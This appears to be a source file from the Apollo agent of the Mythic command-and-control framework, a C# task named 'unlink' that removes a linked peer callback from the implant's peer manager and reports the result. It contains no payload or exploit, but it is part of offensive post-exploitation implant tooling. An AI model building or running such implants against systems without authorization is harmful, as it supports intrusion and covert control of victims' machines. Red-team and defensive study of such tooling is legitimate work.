#define COMMAND_NAME_UPPER

#if DEBUG
#define UNLINK
#endif

#if UNLINK

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.Serialization;
using ST = System.Threading.Tasks;


namespace Tasks
{
    public class unlink : Tasking
    {
        [DataContract]
        internal struct UnlinkParameters
        {
            [DataMember(Name = "connection_info")]
            public LinkInformation ConnectionInfo;
        }

        public unlink(IAgent agent, Task data) : base(agent, data)
        {
        }

        public override void Kill()
        {
            base.Kill();
        }

        public override ST.Task CreateTasking()
        {
            return new ST.Task(() =>
            {
                TaskResponse resp;
                UnlinkParameters parameters = _jsonSerializer.Deserialize<UnlinkParameters>(_data.Parameters);
                CallbackInformation peerInfo;
                if (parameters.ConnectionInfo.Direction == EdgeDirection.BiDirectional || parameters.ConnectionInfo.Direction == EdgeDirection.SourceToDestination)
                {
                    peerInfo = parameters.ConnectionInfo.Destination;
                }
                else
                {
                    peerInfo = parameters.ConnectionInfo.Source;
                }
                if (_agent.GetPeerManager().Remove(peerInfo.UUID))
                {
                    resp = CreateTaskResponse($"Unlinked {peerInfo.Host}", true);
                }
                else
                {
                    resp = CreateTaskResponse($"Failed to unlink {peerInfo.Host}", true, "error");
                }
                // Your code here..
                // // CreateTaskResponse to create a new TaskResposne object
                // // Then add response to queue
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }, _cancellationToken.Token);
        }
    }
}

#endif